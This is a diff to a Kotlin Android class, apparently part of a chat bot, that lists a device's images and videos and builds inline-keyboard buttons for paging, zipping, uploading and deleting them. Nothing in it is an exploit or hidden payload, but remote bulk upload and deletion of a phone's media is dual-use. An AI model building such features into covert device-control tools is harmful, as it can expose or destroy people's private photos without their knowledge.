@@ -22,7 +22,9 @@ import kotlin.random.Random
  * متصفح المعرض (GalleryBrowser) – فئة متطورة لاستعراض وتصنيف الوسائط.
  *
  * ✅ التعديلات الجديدة:
- * - تحسين دالة getGridKb لتطبيق الترقيم الثنائي (01) أو الثلاثي (001) بشكل صارم.
+ * - تحديث استعلام MediaStore لاستخدام MediaStore.Files بدلاً من MediaStore.Images
+ *   لتوافق أفضل مع Android 14 (API 34) وقيود التخزين.
+ * - نظام الترقيم الديناميكي (ثنائي/ثلاثي/رباعي) بناءً على عدد الملفات الكلي.
  * - عرض إجمالي الصفحات والوسائط بوضوح في شريط التنقل.
  * - استخدام Locale.US في جميع عمليات String.format لضمان عرض الأرقام باللاتينية.
  * - إضافة إيموجيز فريدة ومتنوعة للأزرار.
@@ -69,6 +71,7 @@ open class GalleryBrowser(
 
     // ============================================================
     //  جلب الملفات من الجهاز مع التخزين المؤقت
+    //  ✅ تم التحديث لاستخدام MediaStore.Files المتوافق مع Android 14+
     // ============================================================
 
     open fun getGalleryByCategory(category: String, limit: Int): List<Map<String, Any>> {
@@ -101,30 +104,36 @@ open class GalleryBrowser(
                     }
                 }
                 "all" -> {
+                    // ✅ استخدام MediaStore.Files المتوافق مع Android 14
                     val projection = arrayOf(
-                        MediaStore.Images.Media.DATA,
-                        MediaStore.Images.Media.DISPLAY_NAME,
-                        MediaStore.Images.Media.SIZE,
-                        MediaStore.Images.Media.DATE_MODIFIED,
-                        MediaStore.Images.Media.MIME_TYPE
+                        MediaStore.Files.FileColumns.DATA,
+                        MediaStore.Files.FileColumns.DISPLAY_NAME,
+                        MediaStore.Files.FileColumns.SIZE,
+                        MediaStore.Files.FileColumns.DATE_MODIFIED
                     )
-                    val sortOrder = "${MediaStore.Images.Media.DATE_MODIFIED} DESC"
+                    val selection = "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ? OR ${MediaStore.Files.FileColumns.MEDIA_TYPE} = ?"
+                    val selectionArgs = arrayOf(
+                        MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE.toString(),
+                        MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO.toString()
+                    )
+                    val sortOrder = "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"
+
                     ctx.contentResolver.query(
-                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                        MediaStore.Files.getContentUri("external"),
                         projection,
-                        null,
-                        null,
+                        selection,
+                        selectionArgs,
                         sortOrder
                     )?.use { cursor ->
-                        val dataIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
-                        val nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-                        val sizeIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
-                        while (cursor.moveToNext()) {
+                        val dataIndex = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
+                        var count = 0
+                        while (cursor.moveToNext() && count < 300) {
                             val path = cursor.getString(dataIndex)
                             if (!path.isNullOrBlank()) {
                                 val file = File(path)
-                                if (file.exists()) {
+                                if (file.exists() && file.isFile) {
                                     files.add(file)
+                                    count++
                                 }
                             }
                         }
@@ -277,12 +286,12 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  ✅ إنشاء أزرار شبكية مع ترقيم ديناميكي (ثنائي أو ثلاثي)
+    //  ✅ إنشاء أزرار شبكية مع ترقيم ديناميكي (ثنائي/ثلاثي/رباعي)
     //  - إذا كان إجمالي الملفات ≤ 99: يستخدم التنسيق الثنائي (01, 02)
     //  - إذا كان إجمالي الملفات > 99: يستخدم التنسيق الثلاثي (001, 002)
+    //  - إذا كان إجمالي الملفات > 999: يستخدم التنسيق الرباعي (0001, 0002)
     //  - إجمالي الملفات يُعرض دائماً بثلاثة أرقام (001, 042, 123)
-    //  - إجمالي الصفحات يعرض بنفس تنسيق الترقيم (ثنائي أو ثلاثي)
-    //  - ✅ تم تحسين العرض وإضافة إيموجيز فريدة
+    //  - إجمالي الصفحات يعرض بنفس تنسيق الترقيم (ثنائي/ثلاثي/رباعي)
     // ============================================================
 
     fun getGridKb(category: String, page: Int): JSONObject {
@@ -295,12 +304,17 @@ open class GalleryBrowser(
         val endIndex = (startIndex + pageSize).coerceAtMost(totalFiles)
         val pageFiles = if (startIndex < totalFiles) allFiles.subList(startIndex, endIndex) else emptyList()
 
-        // ✅ تحديد التنسيق: ثنائي (02) للملفات القليلة، ثلاثي (003) للكثير
-        val useTriple = totalFiles > 99
+        // ✅ تحديد نظام الترقيم بناءً على العدد الكلي للعناصر
+        val digits = when {
+            totalFiles > 999 -> 4   // رباعي: 0001
+            totalFiles > 99 -> 3    // ثلاثي: 001
+            else -> 2               // ثنائي: 01
+        }
+        val formatString = "%0${digits}d"
 
         // ✅ تنسيق الأرقام مع Locale.US لضمان العرض اللاتيني
-        val currentPageStr = String.format(Locale.US, if (useTriple) "%03d" else "%02d", safePage + 1)
-        val totalPagesStr = String.format(Locale.US, if (useTriple) "%03d" else "%02d", totalPages)
+        val currentPageStr = String.format(Locale.US, formatString, safePage + 1)
+        val totalPagesStr = String.format(Locale.US, formatString, totalPages)
         val totalItemsStr = String.format(Locale.US, "%03d", totalFiles)
 
         val keyboard = mutableListOf<List<Map<String, String>>>()
@@ -318,8 +332,8 @@ open class GalleryBrowser(
                 "audio" -> "🎵"
                 else -> "📄"
             }
-            // ✅ ترقيم العناصر بنفس التنسيق (ثنائي أو ثلاثي)
-            val itemNum = String.format(Locale.US, if (useTriple) "%03d" else "%02d", i + 1)
+            // ✅ الترقيم الديناميكي
+            val itemNum = String.format(Locale.US, formatString, i + 1)
 
             currentRow.add(
                 mapOf(
@@ -336,13 +350,13 @@ open class GalleryBrowser(
             keyboard.add(currentRow)
         }
 
-        // ✅ شريط التنقل مع الإحصائيات (يظهر بوضوح إجمالي الصفحات والوسائط)
+        // ✅ شريط التنقل مع الإحصائيات
         val navRow = mutableListOf<Map<String, String>>()
         if (safePage > 0) {
             navRow.add(mapOf("text" to "⬅️", "callback_data" to "g_nav|$category|${safePage - 1}"))
         }
         navRow.add(mapOf(
-            "text" to "📊 $currentPageStr/$totalPagesStr | 🗂️ $totalItemsStr",
+            "text" to "📊 $currentPageStr/$totalPagesStr | 📁 $totalItemsStr",
             "callback_data" to "g_nav|$category|$safePage"
         ))
         if (safePage < totalPages - 1) {
@@ -350,7 +364,7 @@ open class GalleryBrowser(
         }
         keyboard.add(navRow)
 
-        // ✅ أزرار الإجراءات مع إيموجيز فريدة ومتنوعة
+        // ✅ أزرار الإجراءات مع إيموجيز فريدة
         val actionRow = mutableListOf<Map<String, String>>()
         actionRow.add(mapOf("text" to "🔄 تحديث", "callback_data" to "g_nav|$category|$safePage"))
 
@@ -362,21 +376,18 @@ open class GalleryBrowser(
         actionRow.add(mapOf("text" to selectAllText, "callback_data" to "g_selall|$category|$safePage"))
         keyboard.add(actionRow)
 
-        // ✅ صف الإجراءات الثاني
         val actionRow2 = mutableListOf<Map<String, String>>()
         actionRow2.add(mapOf("text" to "📦 ضغط المحدد", "callback_data" to "g_zip|$category|$safePage"))
         actionRow2.add(mapOf("text" to "📤 رفع المحدد", "callback_data" to "g_upload|$category|$safePage"))
         actionRow2.add(mapOf("text" to "🗑️ حذف المحدد", "callback_data" to "g_del_sel|$category|$safePage"))
         keyboard.add(actionRow2)
 
-        // ✅ صف الحذف الجماعي
         keyboard.add(
             listOf(
                 mapOf("text" to "⚠️ حذف الكل في الصفحة", "callback_data" to "g_conf_del|$category|$safePage")
             )
         )
 
-        // ✅ صف العودة إلى القائمة الرئيسية
         keyboard.add(
             listOf(
                 mapOf("text" to "🏠 القائمة الرئيسية", "callback_data" to "main")
